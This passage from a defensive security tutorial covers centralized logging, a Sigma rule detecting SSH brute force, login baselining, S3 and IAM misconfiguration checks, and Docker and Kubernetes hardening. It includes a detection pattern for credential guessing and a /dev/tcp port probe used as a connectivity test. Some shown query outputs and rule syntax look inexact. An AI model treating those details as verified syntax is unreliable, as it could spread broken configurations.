    queue.size="10000"               # => buffer up to 10000 messages
    # => prevents log loss during brief network outages
)

# Also write auth/authpriv logs locally for immediate troubleshooting
auth,authpriv.* /var/log/auth.log    # => authentication events stay local AND are forwarded
EOF

# Restart rsyslog to apply forwarding configuration
systemctl restart rsyslog
# => check for config errors first: rsyslogd -N1 -f /etc/rsyslog.conf

# Verify forwarding is working: generate a test message and check central server
logger -p auth.info "TEST: rsyslog forwarding from $(hostname) at $(date)"
# => logger sends a syslog message using the auth facility at info severity
# => on central server: tail /var/log/syslog | grep "TEST: rsyslog forwarding"

# --- LOCAL LOG ROTATION: /etc/logrotate.d/myapp ---

cat > /etc/logrotate.d/myapp << 'EOF'
/var/log/myapp/*.log {
    daily                            # => rotate once per day
    rotate 30                        # => keep 30 rotated files (30-day local retention)
    compress                         # => gzip rotated files to save disk space
    delaycompress                    # => keep yesterday's log uncompressed (rsyslog may still write it)
    missingok                        # => do not error if log file missing
    notifempty                       # => skip rotation if log file is empty
    create 0640 myapp adm            # => create new log file with mode 0640, owner myapp:adm
    # => adm group members (sysadmins) can read logs; others cannot
    sharedscripts                    # => run postrotate script once, not per-file
    postrotate
        # Signal myapp to reopen log files after rotation
        systemctl kill -s HUP myapp 2>/dev/null || true
        # => HUP signal tells myapp to close old file descriptor and open new log file
        # => without this, myapp keeps writing to the rotated (renamed) file
    endscript
}
EOF

# Test logrotate configuration without executing rotation
logrotate --debug /etc/logrotate.d/myapp
# => --debug: dry-run mode; shows what would be rotated without modifying files

# Force immediate rotation (for testing)
logrotate --force /etc/logrotate.d/myapp
# => creates /var/log/myapp/app.log.1 and a fresh /var/log/myapp/app.log
```

**Key Takeaway:** Centralized log aggregation must use TCP with buffered queuing — UDP syslog
drops messages silently during congestion, creating gaps in the audit trail exactly when
high-volume attack traffic generates the most logs.

**Why It Matters:** Attackers who compromise a system commonly delete or modify local log files
to erase evidence of their activity. Forwarding logs to a separate server before the attacker
gains control preserves the forensic record. Centralized logs also enable SIEM correlation —
correlating failed SSH attempts across all servers from a single source, for example, detects
distributed brute-force attacks invisible in per-host log views. Logrotate prevents disk
exhaustion from verbose application logging, which can itself become a denial-of-service vector.

---

## Example 48: Writing a Basic SIEM Correlation Rule

**What this covers:** SIEM correlation rules detect attack patterns by aggregating and
correlating events from multiple log sources. Sigma is a vendor-neutral rule format that
compiles to Splunk SPL, Elasticsearch queries, and other SIEM query languages. This example
writes a Sigma rule detecting SSH brute-force attacks.

**Scenario:** A SIEM receives forwarded auth.log events from all servers. The security team
wants a rule that fires when more than 10 failed SSH logins occur from the same source IP
within 5 minutes.

```yaml
# /etc/sigma/rules/ssh-brute-force.yml
# Sigma rule format: https://github.com/SigmaHQ/sigma

title: SSH Brute Force Login Attempt
id: a5c5e75d-5a48-4d4b-9a3e-3b5f2f8c1234
# => id: unique UUID; do not reuse across rules; generated with uuidgen

status: stable
# => stable: rule is tested and production-ready
# => options: stable | test | experimental | deprecated

description: |
  Detects multiple failed SSH authentication attempts from a single source IP
  within a short time window, indicating a brute-force or password spray attack.

references:
  - https://attack.mitre.org/techniques/T1110/001/
  # => T1110.001: Brute Force - Password Guessing (MITRE ATT&CK mapping)

author: Security Team
date: 2026-05-21
tags:
  - attack.credential_access # => MITRE ATT&CK tactic
  - attack.t1110.001 # => MITRE ATT&CK technique

logsource:
  product: linux
  service: auth
  # => targets /var/log/auth.log or journald auth facility
  # => Sigma backends map this to the correct log source in each SIEM

detection:
  selection:
    # Match log lines containing failed SSH authentication
    EventID: "sshd" # => process name field in syslog
    Message|contains:
      - "Failed password for"
      - "Failed publickey for"
      - "Invalid user"
      # => each pattern matches a different sshd failure message format
      # => "Failed password for root from 192.168.x.5 port 45231 ssh2"
      # => "Invalid user admin from 10.x.0.1 port 22834"

  timeframe: 5m # => look-back window: events within 5 minutes

  condition: selection | count() by src_ip > 10
  # => aggregate: count matching events grouped by source IP
  # => fire alert when any single IP exceeds 10 failures in 5 minutes
  # => count() by src_ip requires the SIEM to extract src_ip from log message

falsepositives:
  - Automated configuration management tools running with wrong credentials
  - Monitoring systems performing SSH connectivity checks with bad keys
  # => false positives documented for analyst triage

level: medium
# => severity: critical | high | medium | low | informational
# => medium: warrants investigation but not immediate escalation
# => combine with asset criticality to auto-escalate for production servers
```

```bash
# --- Compile Sigma rule to Elasticsearch/OpenSearch query ---
# Install sigma-cli: pip install sigma-cli

sigma convert \
  -t elasticsearch \               # => target SIEM backend: elasticsearch
  -p ecs-main \                    # => pipeline: Elastic Common Schema field mapping
  /etc/sigma/rules/ssh-brute-force.yml

# => Output (Elasticsearch KQL):
# event.dataset:auth AND process.name:sshd AND
# (message:*"Failed password for"* OR message:*"Invalid user"*) |
# stats count() by source.ip | where count > 10

# Compile to Splunk SPL
sigma convert -t splunk /etc/sigma/rules/ssh-brute-force.yml
# => Output:
# source=/var/log/auth.log process_name=sshd
#   ("Failed password for" OR "Invalid user")
# | stats count by src_ip | where count > 10

# Validate rule syntax without converting
sigma check /etc/sigma/rules/ssh-brute-force.yml
# => "OK": rule is syntactically valid and fields map to the logsource
```

**Key Takeaway:** Sigma's vendor-neutral format lets you write a rule once and compile it to
any supported SIEM — the same rule works in Splunk, Elasticsearch, QRadar, and Microsoft
Sentinel without modification.

**Why It Matters:** SIEM correlation rules transform raw log streams into actionable security
alerts. A brute-force detection rule covers the most common initial access technique attackers
use against internet-facing SSH services. The 10-events-in-5-minutes threshold balances
sensitivity (catching slow brute-force attacks) against specificity (avoiding false positives
from misconfigured monitoring). Sigma rules checked into version control create an auditable,
peer-reviewed detection library rather than configuration locked inside a vendor's GUI.

---

## Example 49: Establishing a Log Baseline

**What this covers:** A log baseline documents what normal activity looks like — which users
log in, from which IPs, at which hours. Deviations from the baseline surface anomalous activity
that rule-based systems miss. This example extracts normal login patterns from auth.log using
awk and grep.

**Scenario:** A security analyst on Ubuntu 22.04 wants to establish a 30-day normal login
baseline before deploying anomaly detection. The baseline captures: who logs in, from where,
and when.

```bash
# --- Extract successful SSH logins from auth.log ---

LOG_FILE="/var/log/auth.log"
BASELINE_DIR="/opt/security/baselines"
mkdir -p "${BASELINE_DIR}"

# Show raw successful login entries (sample of the data)
grep "Accepted password\|Accepted publickey" "${LOG_FILE}" | head -5
# => May 21 08:12:45 server01 sshd[12345]: Accepted publickey for alice from 10.x.99.5 port 43210 ssh2
# => May 21 08:45:03 server01 sshd[12346]: Accepted password for bob from 10.x.99.6 port 52341 ssh2
# => each line: timestamp, hostname, process, auth method, username, source IP, port

# --- Baseline 1: Unique source IPs per user ---
grep "Accepted" "${LOG_FILE}" \
  | awk '{
      # Extract username (field 9) and source IP (field 11)
      user = $9; ip = $11;
      count[user][ip]++
    }
    END {
      for (user in count)
        for (ip in count[user])
          printf "%s\t%s\t%d\n", user, ip, count[user][ip]
    }' \
  | sort -k1,1 -k3,3rn \
  > "${BASELINE_DIR}/user-source-ips.tsv"
# => alice    10.x.99.5    847    (alice always logs in from 10.x.99.5; 847 times in period)
# => bob      10.x.99.6    312
# => svc-ci   10.x.20.100  1204   (CI service account; high frequency is normal for it)

# --- Baseline 2: Login hour distribution (detect off-hours logins) ---
grep "Accepted" "${LOG_FILE}" \
  | awk '{
      # Parse hour from timestamp field 3 (format: HH:MM:SS)
      split($3, time, ":");
      hour = time[1];
      user = $9;
      hourly[user][hour]++
    }
    END {
      for (user in hourly)
        for (h in hourly[user])
          printf "%s\t%02d:00\t%d\n", user, h, hourly[user][h]
    }' \
  | sort -k1,1 -k2,2n \
  > "${BASELINE_DIR}/user-login-hours.tsv"
# => alice    08:00    42    (alice logs in between 08:00–17:00; normal business hours)
# => alice    09:00    67
# => alice    02:00     0    (alice never logs in at 2am; any entry here is anomalous)

# --- Baseline 3: Failed login frequency per user (expected noise level) ---
grep "Failed password\|Failed publickey\|Invalid user" "${LOG_FILE}" \
  | awk '{
      # Failed lines: "Failed password for USER" or "Failed password for invalid user USER"
      if ($0 ~ /invalid user/) { user = $11 } else { user = $9 }
      ip = $13; fails[user][ip]++
    }
    END {
      for (user in fails)
        for (ip in fails[user])
          printf "%s\t%s\t%d\n", user, ip, fails[user][ip]
    }' \
  | sort -k3,3rn \
  > "${BASELINE_DIR}/failed-login-baseline.tsv"
# => root          45.33.32.156    4821   (internet scanners fail constantly; document as baseline noise)
# => alice         10.x.99.5         3    (alice occasionally miskeys; 3 failures is normal)
# => ALERT threshold: >20 failures from non-scanner IP for a valid user = brute force

# Summarize baseline statistics
echo "=== Login Baseline Summary ==="
echo "Unique source IPs per user:"
awk '{print $1}' "${BASELINE_DIR}/user-source-ips.tsv" | sort -u | while read u; do
    count=$(grep "^${u}" "${BASELINE_DIR}/user-source-ips.tsv" | wc -l)
    printf "  %-15s %d unique IPs\n" "${u}" "${count}"
done
# => alice           1 unique IPs   (single workstation; new IP = anomaly)
# => bob             2 unique IPs   (office + home; third IP = anomaly)
# => svc-ci          1 unique IPs   (service account; any new IP = critical alert)
```

**Key Takeaway:** A baseline's value is its specificity — "alice logs in from exactly one IP
between 08:00–17:00 on weekdays" is far more actionable than generic thresholds like "more than
5 failed logins."

**Why It Matters:** Most anomaly detection systems fire on absolute thresholds that generate
too many false positives to act on. User-specific baselines enable behavioral anomaly detection:
a login from a new country, at 3am, for an account that has never logged in outside business
hours, is a high-confidence indicator of credential compromise. Building baselines before a
security incident gives analysts pre-existing context for post-incident forensic timelines.

---

## Example 50: AWS S3 Public Bucket Misconfiguration

**What this covers:** Publicly accessible S3 buckets have caused numerous major data breaches.
This example uses the AWS CLI to detect a public bucket misconfiguration via the bucket ACL
and public access block settings, then applies the remediation.

**Scenario:** A cloud security review on AWS CLI v2 finds an S3 bucket named
"mycompany-app-uploads" that is publicly readable. The analyst investigates and remediates.

```bash
# --- Detection: check if a bucket has public access enabled ---

BUCKET="mycompany-app-uploads"

# Check Block Public Access settings (the first line of defense)
aws s3api get-public-access-block --bucket "${BUCKET}"
# => MISCONFIGURED output:
# {
#   "PublicAccessBlockConfiguration": {
#     "BlockPublicAcls": false,          # => public ACLs NOT blocked
#     "IgnorePublicAcls": false,         # => public ACLs NOT ignored
#     "BlockPublicPolicy": false,        # => public bucket policies NOT blocked
#     "RestrictPublicBuckets": false     # => public bucket restrictions OFF
#   }
# }
# => all four settings should be "true" for a private bucket

# Check the bucket ACL for public grants
aws s3api get-bucket-acl --bucket "${BUCKET}"
# => MISCONFIGURED output (public read grant present):
# {
#   "Grants": [
#     {
#       "Grantee": {
#         "Type": "Group",
#         "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
#         # => AllUsers = the public internet; anyone can read without authentication
#       },
#       "Permission": "READ"             # => public can list and download all objects
#     }
#   ]
# }

# Check bucket policy for public allow statements
aws s3api get-bucket-policy --bucket "${BUCKET}" 2>/dev/null \
  | python3 -c "import json,sys; p=json.load(sys.stdin); [print(s) for s in p['Statement'] if s.get('Principal')=='*']"
# => prints any statement with Principal: "*" (allows unauthenticated access)
# => {"Sid":"PublicRead","Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::mycompany-app-uploads/*"}

# Count total objects exposed (scope of breach if bucket was public)
aws s3 ls s3://"${BUCKET}" --recursive --summarize 2>/dev/null | tail -2
# => Total Objects: 4823
# => Total Size:    12.4 GiB
# => 4823 objects potentially exfiltrated if bucket was public before detection

# --- Remediation: enable all four Block Public Access settings ---
aws s3api put-public-access-block \
  --bucket "${BUCKET}" \
  --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
# => BlockPublicAcls:       prevents new public ACLs from being set
# => IgnorePublicAcls:      ignores existing public ACLs (retroactive protection)
# => BlockPublicPolicy:     prevents bucket policies from granting public access
# => RestrictPublicBuckets: restricts access to only authorized AWS accounts and services

# Remove the public-read ACL by setting canned ACL to private
aws s3api put-bucket-acl --bucket "${BUCKET}" --acl private
# => replaces existing ACL with private (only bucket owner has access)

# Verify remediation
aws s3api get-public-access-block --bucket "${BUCKET}" \
  | python3 -c "import json,sys; cfg=json.load(sys.stdin)['PublicAccessBlockConfiguration']; print('SECURE' if all(cfg.values()) else 'STILL MISCONFIGURED')"
# => SECURE  (all four flags are true)

# Enable AWS Config rule to alert on future public bucket creation
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "s3-bucket-public-read-prohibited",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"
  }
}'
# => AWS managed Config rule; automatically evaluates all S3 buckets for public read
# => non-compliant buckets trigger a finding in AWS Config and Security Hub
```

**Key Takeaway:** AWS Block Public Access settings override ACLs and bucket policies, making
them the most reliable control — enable all four settings at both the bucket and account level
to prevent any future misconfiguration from exposing data.

**Why It Matters:** Public S3 buckets have exposed hundreds of millions of customer records,
healthcare data, and government documents because developers creating buckets for static website
hosting or file sharing accidentally set them public and never revisited the configuration.
Enabling Block Public Access at the AWS account level (not just per-bucket) prevents any bucket
in the account from being made public, even if an IAM policy or CDK template incorrectly grants
public access.

---

## Example 51: AWS Config Rule for IAM

**What this covers:** AWS Config evaluates the configuration of AWS resources against desired
state rules and flags non-compliant resources. This example creates a Config rule that checks
whether IAM users have MFA enabled, and queries the compliance results.

**Scenario:** A cloud security team needs to enforce MFA for all IAM console users. AWS Config
provides continuous compliance monitoring and a queryable record of which accounts violate
the policy.

```bash
# --- Enable AWS Config recording (one-time setup per account/region) ---

# Create an S3 bucket for Config snapshots
CONFIG_BUCKET="mycompany-aws-config-$(aws sts get-caller-identity --query Account --output text)"
aws s3api create-bucket --bucket "${CONFIG_BUCKET}" --region us-east-1
# => bucket stores configuration history and compliance snapshots

# Create IAM role for Config service
aws iam create-role \
  --role-name AWSConfigRole \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{"Effect":"Allow","Principal":{"Service":"config.amazonaws.com"},"Action":"sts:AssumeRole"}]
  }'
# => Config assumes this role to read resource configurations across the account

aws iam attach-role-policy \
  --role-name AWSConfigRole \
  --policy-arn arn:aws:iam::aws:policy/service-role/AWS_ConfigRole
# => AWS managed policy granting Config required read permissions

# Configure Config recorder (records all supported resource types)
aws configservice put-configuration-recorder \
  --configuration-recorder '{
    "name": "default",
    "roleARN": "arn:aws:iam::123456789012:role/AWSConfigRole",
    "recordingGroup": {
      "allSupported": true,
      "includeGlobalResourceTypes": true
    }
  }'
# => allSupported: records EC2, S3, IAM, RDS, and all other supported resource types
# => includeGlobalResourceTypes: includes IAM users/roles/policies (global, not region-specific)

aws configservice put-delivery-channel \
  --delivery-channel "{\"name\":\"default\",\"s3BucketName\":\"${CONFIG_BUCKET}\"}"
# => delivery channel: where Config sends snapshots and change notifications

aws configservice start-configuration-recorder --configuration-recorder-name default
# => starts recording; Config now tracks resource configuration changes

# --- Create Config rule: MFA required for IAM users with console access ---
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "iam-user-mfa-enabled",
  "Description": "Checks that all IAM users with console access have MFA enabled",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "IAM_USER_MFA_ENABLED"
    # => AWS managed rule: no Lambda function needed; Config evaluates natively
    # => evaluates every IAM user in the account on a periodic basis
  },
  "MaximumExecutionFrequency": "TwentyFour_Hours"
  # => re-evaluate every 24 hours; also triggers on IAM user configuration changes
}'

# Start a manual evaluation run (instead of waiting for next periodic check)
aws configservice start-config-rules-evaluation \
  --config-rule-names iam-user-mfa-enabled
# => triggers immediate evaluation; results available in ~30 seconds

# --- Query compliance results ---
aws configservice get-compliance-details-by-config-rule \
  --config-rule-name iam-user-mfa-enabled \
  --compliance-types NON_COMPLIANT
# => returns list of non-compliant IAM users (those without MFA)

# Parse output to list non-compliant user names
aws configservice get-compliance-details-by-config-rule \
  --config-rule-name iam-user-mfa-enabled \
  --compliance-types NON_COMPLIANT \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
for r in data['EvaluationResults']:
    user_id = r['EvaluationResultIdentifier']['EvaluationResultQualifier']['ResourceId']
    print(f'NON_COMPLIANT (no MFA): {user_id}')
"
# => NON_COMPLIANT (no MFA): alice
# => NON_COMPLIANT (no MFA): svc-deploy
# => each listed user must enable MFA or have console access revoked

# Get overall compliance summary for the rule
aws configservice get-compliance-summary-by-config-rule \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
for s in data['ComplianceSummariesByConfigRule']:
    if s['ConfigRuleName'] == 'iam-user-mfa-enabled':
        comp = s['Compliance']['ComplianceContributorCount']
        print(f\"Compliant: {comp.get('CappedCount', 0)}, NonCompliant: {s['Compliance'].get('ComplianceType', 'UNKNOWN')}\")
"
```

**Key Takeaway:** AWS Config managed rules require no custom code — using the
`IAM_USER_MFA_ENABLED` managed rule identifier gives continuous MFA compliance monitoring
across the entire account with a single API call.

**Why It Matters:** IAM users without MFA are the most exploited attack vector in cloud
account takeovers. Stolen access keys combined with console credentials without MFA give
attackers unrestricted account access. AWS Config's continuous evaluation catches new users
created without MFA within 24 hours rather than at the next manual audit, which may be
months away. Integrating Config findings with AWS Security Hub and SNS enables automated
alerts and remediation workflows for each non-compliant resource.

---

## Example 52: Docker Container Hardening

**What this covers:** Docker containers share the host kernel, so a compromised container can
escape to the host if run with excessive privileges. This example annotates a hardened
Dockerfile and runtime flags that reduce the attack surface of a production container.

**Scenario:** A team deploys a Python Flask API in Docker on Ubuntu 22.04. The default
container runs as root with no resource limits. The hardened version follows container security
best practices.

```dockerfile
# Hardened Dockerfile for a Python Flask API

# Use a specific digest instead of a floating tag to prevent image substitution
FROM python:3.12-slim@sha256:abc123def456...
# => pinning by digest ensures the exact same image layers every build
# => floating tags like "python:3.12-slim" can silently change to include vulnerabilities

# Install dependencies as root (required for package installation)
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        curl=7.88.1-10+deb12u8 \
    # => pin package versions to prevent upgrade to vulnerable version during build
    && apt-get clean && rm -rf /var/lib/apt/lists/*
    # => remove apt cache; reduces image size and eliminates cached package metadata

# Create a non-root user for running the application
RUN groupadd --gid 1001 appgroup && \
    useradd --uid 1001 --gid 1001 --no-create-home --shell /usr/sbin/nologin appuser
# => UID/GID 1001: non-root; if container escapes, host process runs as UID 1001 (not root)
# => --no-create-home: no home directory (reduces writable surface)
# => --shell /usr/sbin/nologin: cannot spawn interactive shell

WORKDIR /app

# Copy requirements and install Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
# => --no-cache-dir: pip cache not stored in image (smaller image, no stale packages)

# Copy application source
COPY --chown=appuser:appgroup . .
# => --chown: files owned by appuser, not root; app cannot modify its own files at runtime

# Switch to non-root user for all subsequent RUN, CMD, ENTRYPOINT
USER appuser
# => all runtime processes run as UID 1001; cannot write to /etc, /usr, or install packages

EXPOSE 5000
# => documents the port; does not actually publish it (use -p at runtime)

# Use exec form (not shell form) to receive signals properly
CMD ["python", "-m", "gunicorn", "--bind", "0.0.0.0:5000", "app:app"]
# => exec form: PID 1 is gunicorn (receives SIGTERM for graceful shutdown)
# => shell form ["sh", "-c", "gunicorn..."] makes sh PID 1; SIGTERM not forwarded to gunicorn
```

```bash
# --- Hardened docker run command ---

docker run \
  --name api-service \
  --user 1001:1001 \                    # => enforce non-root even if Dockerfile USER is changed
  --read-only \                         # => container filesystem is read-only; prevents writing malware
  --tmpfs /tmp:size=64m,mode=1777 \     # => writable /tmp in memory only; 64MB limit
  --security-opt no-new-privileges \    # => prevents setuid binaries from escalating privileges
  # => blocks sudo, su, and suid exploits inside the container
  --cap-drop ALL \                      # => drop all Linux capabilities
  --cap-add NET_BIND_SERVICE \          # => re-add only what the app needs (bind port <1024 if needed)
  # => default Docker capabilities include CAP_NET_RAW (raw sockets) and others not needed
  --memory 256m \                       # => OOM kill container if it exceeds 256MB RAM
  --cpus 0.5 \                          # => limit to 50% of one CPU core
  --pids-limit 100 \                    # => prevent fork bomb from consuming all PIDs
  --network app-network \               # => custom bridge network (not default bridge)
  # => custom networks provide DNS isolation between containers
  --env-file /run/secrets/app.env \     # => load secrets from a file, not command line
  # => secrets on command line appear in `docker inspect` and `ps aux` output
  -p 127.0.0.1:5000:5000 \             # => bind to loopback only; nginx proxy handles external traffic
  mycompany/api-service:sha256-abc123
  # => reference image by digest for reproducibility

# Scan the image for known vulnerabilities
docker scout cves mycompany/api-service:sha256-abc123 \
  --only-severity critical,high
# => docker scout: built-in vulnerability scanner (Docker Desktop / Scout CLI)
# => reports CVEs in base image and installed packages
# => fix critical/high findings before deploying to production
```

**Key Takeaway:** The three highest-impact container hardening steps are: run as a non-root
user, set `--read-only` on the filesystem, and drop all capabilities with `--cap-drop ALL` —
these three controls together prevent the most common container escape techniques.

**Why It Matters:** Container breakouts that escalate from container-root to host-root are
documented CVEs exploited in the wild (CVE-2019-5736 runc escape, CVE-2022-0185 cgroup
escape). Running as non-root means a successful container escape lands as an unprivileged host
user. Read-only filesystems prevent attackers from writing persistence mechanisms. Capability
dropping removes the kernel attack surface that most privilege escalation exploits target.

---

## Example 53: Kubernetes NetworkPolicy

**What this covers:** Kubernetes NetworkPolicy restricts pod-to-pod traffic at the network
layer, implementing microsegmentation within a cluster. Without NetworkPolicy, all pods in all
namespaces can communicate with each other by default.

**Scenario:** A Kubernetes 1.30 cluster runs a three-tier application: frontend pods in the
`frontend` namespace, API pods in the `backend` namespace, and a PostgreSQL pod in the `data`
namespace. NetworkPolicies enforce that only legitimate traffic paths are permitted.

```yaml
# --- Policy 1: Backend namespace — allow ingress only from frontend ---
# File: k8s/network-policies/backend-ingress.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-allow-frontend-only
  namespace: backend # => policy applies to pods in the "backend" namespace
spec:
  podSelector:
    matchLabels:
      app: api # => applies to pods labeled app=api (the API service pods)
  policyTypes:
    - Ingress # => this policy governs inbound traffic to selected pods
    - Egress # => also governs outbound traffic from selected pods
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: frontend
          # => allow ingress from the "frontend" namespace only
          podSelector:
            matchLabels:
              app: web
          # => AND from pods labeled app=web within that namespace
          # => namespaceSelector + podSelector combined = namespace AND pod must match
      ports:
        - protocol: TCP
          port: 8080
          # => only port 8080 (API server port) allowed; all other ports blocked
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: data
          podSelector:
            matchLabels:
              app: postgres
      ports:
        - protocol: TCP
          port: 5432
          # => API pods may only connect to postgres on port 5432 in the data namespace
    - to: [] # => no other egress allowed; implicit deny for all other destinations
      ports:
        - protocol: UDP
          port: 53
          # => allow DNS resolution (kube-dns); required for service discovery
```

```yaml
# --- Policy 2: Data namespace — deny all ingress except from backend ---
# File: k8s/network-policies/data-deny-all-except-backend.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: data-allow-backend-only
  namespace: data # => applies to the data namespace
spec:
  podSelector:
    matchLabels:
      app: postgres # => applies to PostgreSQL pods
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: backend
          podSelector:
            matchLabels:
              app: api
          # => only API pods in backend namespace may connect to postgres
      ports:
        - protocol: TCP
          port: 5432
  # => no egress policy defined; postgres pods have unrestricted egress (e.g., for backups)
  # => add egress restriction if backup destinations are known and finite
```

```bash
# Apply both NetworkPolicy manifests
kubectl apply -f k8s/network-policies/
# => creates NetworkPolicy objects; CNI plugin (Calico/Cilium) enforces them in iptables/eBPF

# Verify policies are created
kubectl get networkpolicies -A
# => NAMESPACE   NAME                           POD-SELECTOR   AGE
# => backend     backend-allow-frontend-only    app=api        10s
# => data        data-allow-backend-only        app=postgres   10s

# Test connectivity (should succeed): frontend pod → backend API
kubectl exec -n frontend deploy/web -- curl -s http://api.backend.svc.cluster.local.:8080/health
# => {"status":"ok"}  — allowed by NetworkPolicy

# Test connectivity (should fail): frontend pod → postgres (bypassing API)
kubectl exec -n frontend deploy/web -- \
  timeout 5 bash -c "echo > /dev/tcp/postgres.data.svc.cluster.local./5432" 2>&1
# => bash: connect: Connection timed out  — blocked by NetworkPolicy on data namespace
# => timeout 5 prevents the test from hanging indefinitely

# Test connectivity (should fail): rogue pod in default namespace → postgres
kubectl run rogue --image=postgres:15 -n default --rm -it -- \
  psql -h postgres.data.svc.cluster.local. -U postgres 2>&1 | head -2
# => psql: error: connection to server at "postgres.data.svc.cluster.local." failed
# => Connection timed out — default namespace not in allowlist
```

**Key Takeaway:** Kubernetes NetworkPolicy uses a default-deny model only when at least one
NetworkPolicy selects a pod — pods with no selecting NetworkPolicy have unrestricted traffic;
always apply an explicit deny-all policy first, then add allow rules on top.

**Why It Matters:** Without NetworkPolicy, a single compromised pod can directly connect to
every other pod and service in the cluster, including the Kubernetes API server and internal
databases. Microsegmentation with NetworkPolicy contains lateral movement to the blast radius
of the compromised pod's legitimate traffic paths. NetworkPolicy is especially critical in
multi-tenant clusters where different teams or customers share namespaces, as default open
networking violates tenant isolation.

---

## Example 54: Kubernetes RBAC

**What this covers:** Kubernetes RBAC controls which API operations each identity (user,
service account, or group) can perform on which resources. This example creates a
least-privilege service account for a CI/CD pipeline that only needs to deploy to a single
namespace.

**Scenario:** A CI/CD pipeline (GitHub Actions) needs to deploy to the `production` namespace
in a Kubernetes 1.30 cluster. The pipeline should only update Deployments and ConfigMaps in
that namespace — nothing else.

```yaml
# --- Step 1: Create a dedicated ServiceAccount for the CI pipeline ---
# File: k8s/rbac/ci-service-account.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: ci-deployer
  namespace: production
  # => ServiceAccount scoped to the production namespace
  # => tokens issued to this SA are limited to its bound permissions
automountServiceAccountToken: false
# => disable automatic token mounting in pods that use this SA
# => CI pipeline fetches token explicitly; prevents accidental token exposure
```

```yaml
# --- Step 2: Define a Role with minimum required permissions ---
# File: k8s/rbac/ci-deployer-role.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
# => Role (not ClusterRole): scoped to a single namespace
# => ClusterRole would grant permissions cluster-wide — never use for CI pipelines
metadata:
  name: ci-deployer-role
  namespace: production
rules:
  - apiGroups: ["apps"]
    resources: ["deployments"]
    verbs: ["get", "list", "patch", "update"]
    # => get/list: read current deployment state
    # => patch/update: roll out new image versions
    # => NOT "create" or "delete": pipeline cannot create new deployments or delete existing ones
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get", "list", "update", "patch"]
    # => configmap update: pipeline can update app configuration
    # => NOT "create" or "delete": prevents pipeline from creating new configmaps as data exfil
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
    # => read-only pod access: pipeline can check rollout status by watching pod states
    # => NOT "exec" or "delete": pipeline cannot exec into pods or kill them
```

```yaml
# --- Step 3: Bind the Role to the ServiceAccount ---
# File: k8s/rbac/ci-deployer-binding.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
# => RoleBinding (not ClusterRoleBinding): applies Role in production namespace only
metadata:
  name: ci-deployer-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: ci-deployer # => the ServiceAccount created in Step 1
    namespace: production
roleRef:
  kind: Role
  name: ci-deployer-role # => the Role defined in Step 2
  apiGroup: rbac.authorization.k8s.io
```

```bash
# Apply all three manifests
kubectl apply -f k8s/rbac/

# Generate a long-lived token for the CI pipeline (Kubernetes 1.24+ requires explicit creation)
kubectl create token ci-deployer \
  --namespace production \
  --duration 8760h \           # => 1-year token; use short-lived tokens with OIDC for production
  --output json \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['status']['token'])"
# => outputs: eyJhbGciOiJSUzI1NiIs...  (JWT token; add to GitHub Actions secret)

# Verify the ServiceAccount's permissions (dry-run authorization check)
kubectl auth can-i update deployments \
  --as system:serviceaccount:production:ci-deployer \
  --namespace production
# => yes  (allowed by role)

kubectl auth can-i delete deployments \
  --as system:serviceaccount:production:ci-deployer \
  --namespace production
# => no   (not in role's verb list)

kubectl auth can-i get pods \
  --as system:serviceaccount:production:ci-deployer \
  --namespace default
# => no   (Role is scoped to production namespace; cannot access default namespace)

# List all permissions for the ServiceAccount
kubectl auth can-i --list \
  --as system:serviceaccount:production:ci-deployer \
  --namespace production
# => Resources                      Non-Resource URLs   Resource Names   Verbs
# => deployments.apps               []                  []               [get list patch update]
# => configmaps                     []                  []               [get list patch update]
# => pods                           []                  []               [get list]
```

**Key Takeaway:** Using `Role` (namespace-scoped) instead of `ClusterRole`, and omitting
destructive verbs (`delete`, `create`, `exec`), ensures a compromised CI token cannot affect
resources outside the deployment namespace or delete the production workload it is supposed to
manage.

**Why It Matters:** Kubernetes service account tokens embedded in CI/CD pipelines are a
high-value target because they often persist indefinitely and carry broad cluster-admin or
default service account permissions inherited from misconfigured workloads. Principle of
least privilege applied to RBAC means a stolen CI token can update a deployment image — the
only thing it needs to do — and nothing else. Regular audits with `kubectl auth can-i --list`
catch permission creep before it becomes an exploitable attack surface.

---

## Example 55: Incident Response Phases

**What this covers:** Incident response (IR) follows a structured lifecycle: Preparation,
Identification, Containment, Eradication, Recovery, and Lessons Learned (NIST SP 800-61).
This example implements a bash IR script that automates evidence collection across the first
three phases.

**Scenario:** An alert fires at 02:15 UTC indicating unusual outbound traffic from
server01 (10.x.10.25). The on-call engineer begins IR using this script.

```bash
#!/usr/bin/env bash
# ir-initial-response.sh — Initial incident response evidence collection
# NIST SP 800-61 Phase 2 (Identification) + Phase 3 (Containment)
set -euo pipefail

INCIDENT_ID="INC-$(date +%Y%m%d-%H%M%S)"
IR_DIR="/secure-storage/incidents/${INCIDENT_ID}"
# => /secure-storage is on a separate, append-only NFS mount (cannot be deleted by attacker)
mkdir -p "${IR_DIR}"

